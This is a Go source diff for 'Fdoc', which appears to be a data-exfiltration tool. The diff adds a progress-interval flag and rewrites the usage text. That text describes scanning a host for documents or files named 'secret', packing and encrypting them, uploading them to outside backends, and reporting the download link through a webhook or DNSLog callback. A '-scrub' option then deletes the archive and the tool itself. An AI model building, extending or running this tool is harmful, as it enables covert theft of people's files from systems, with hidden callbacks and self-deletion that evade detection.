@@ -38,9 +38,11 @@ type FlagInfo struct {
 	DNS        string
 	TaskID     string
 	CBTimeout  time.Duration
-	Scrub      bool
-	Encrypt    bool
-	EncryptKey string
+	// ProgressInterval is NoBar upload/encrypt tick period; 0 disables; default 3m via flag.
+	ProgressInterval time.Duration
+	Scrub            bool
+	Encrypt          bool
+	EncryptKey       string
 }
 
 // InitFlag parses flags and validates inputs.
@@ -179,12 +181,19 @@ func (info *FlagInfo) GetFlag() {
 	flag.StringVar(&info.TaskID, "task-id", "", "callback task id (auto if empty)")
 	var cbTimeoutSec float64
 	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "callback timeout seconds")
+	var progressIntervalMin float64
+	flag.Float64Var(&progressIntervalMin, "progress-interval", 3, "minutes between upload/encrypt progress lines when no bar (0=off)")
 	flag.BoolVar(&info.Scrub, "scrub", false, "delete archive + self after success")
 	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt before upload (needs -key)")
 	flag.StringVar(&info.EncryptKey, "key", "", "encrypt key (with -encrypt; not -k)")
 
 	flag.Parse()
 	info.CBTimeout = time.Duration(cbTimeoutSec * float64(time.Second))
+	if progressIntervalMin <= 0 {
+		info.ProgressInterval = -1 // disable ticks
+	} else {
+		info.ProgressInterval = time.Duration(progressIntervalMin * float64(time.Minute))
+	}
 
 	if info.OutputPath == "" {
 		info.OutputPath = fmt.Sprintf("output_%s.tgz", time.Now().Format("20060102_150405"))
@@ -193,21 +202,66 @@ func (info *FlagInfo) GetFlag() {
 
 func printUsage() {
 	out := flag.CommandLine.Output()
-	fmt.Fprintf(out, `Fdoc — find files and pack them into a .tgz
+	fmt.Fprintf(out, `Fdoc is a file collector: filter files on a host and pack them into .tgz.
 
-  Fdoc -d /data -o out.tgz              pack documents under /data
-  Fdoc -d /data -size                   only show how big a pack would be
-  Fdoc -d /data -o out.tgz -upload -q   pack, upload, print download URL
+Optional -upload embeds uploader (auto backend by size). Without -webhook/-dns,
+the download URL is printed locally. With -webhook/-dns, the link is pushed via
+failover callback. -encrypt requires -upload and -key (decrypt with Fdoc decrypt).
+
+Usage:
+  Fdoc [flags]
+  Fdoc decrypt [flags] <cipher>
+
+Examples:
+  Fdoc -d /data -o out.tgz
+  Fdoc -d /data -size
+  Fdoc -d /data -o out.tgz -upload -q
   Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
+  Fdoc -d /data -e zip -f secret -max-file 0 -max 10GB -upload -encrypt -key SECRET -b gg
   Fdoc decrypt -key SECRET -o out.tgz cipher.bin
 
 Filters (-e/-f/-k/-t) are AND; comma lists inside one flag are OR.
-Default: -e documents, -max 1GB. Exit: 0 ok, 1 error, 2 hit -max (partial kept).
-Docs: README.md / README.zh-CN.md
+Default: -e documents, -max 1GB, -max-file 100MB.
+Exit: 0 ok, 1 error, 2 hit -max (partial kept). Docs: README.md / README.zh-CN.md
 
+Flags:
+INPUT:
+   -d string                 scan root (default: home)
+   -x string                 directories to skip, comma-separated (replaces OS defaults if set)
+
+FILTERING:
+   -e string                 ext filter: documents|all|any|pdf,txt,zip,... (default "documents")
+   -f string                 filename contains (comma = OR)
+   -k string                 file content contains (comma = OR)
+   -t string                 only files modified on/after date (YYYY-MM-DD)
+
+PACK:
+   -o string                 output .tgz path (default output_<timestamp>.tgz)
+   -max string               stop packing after this total size (default "1GB")
+   -max-file string          skip a single file larger than this (default "100MB"; 0=off)
+   -size                     measure matched size only; do not pack
+
+UPLOAD:
+   -upload                   after packing, upload archive (auto backend by size)
+   -b string                 pin upload backend (default: auto probe+failover)
+   -force                    allow flaky/down upload backends
+   -encrypt                  encrypt stream before upload (requires -upload and -key)
+   -key string               encryption key for -encrypt (not the same as -k)
+   -progress-interval float  minutes between upload/encrypt progress lines when no bar (default 3; 0=off)
+
+CALLBACK:
+   -webhook string           optional HTTPS callback URL (POST JSON; http only for loopback)
+   -dns string               optional DNSLog base (failover if webhook fails/unset)
+   -task-id string           callback task id (auto if empty; with -webhook/-dns)
+   -cb-timeout float         webhook timeout / DNS budget seconds (default 15)
+
+CLEANUP:
+   -scrub                    after successful upload (+ callback if any), delete archive and self
+
+OUTPUT:
+   -q                        quiet (human logs off; machine lines still print)
+   -v                        verbose (matched paths + upload probe/retry details)
 `)
-	fmt.Fprintf(out, "Flags:\n")
-	flag.PrintDefaults()
 }
 
 func (info *FlagInfo) initRootPath() {
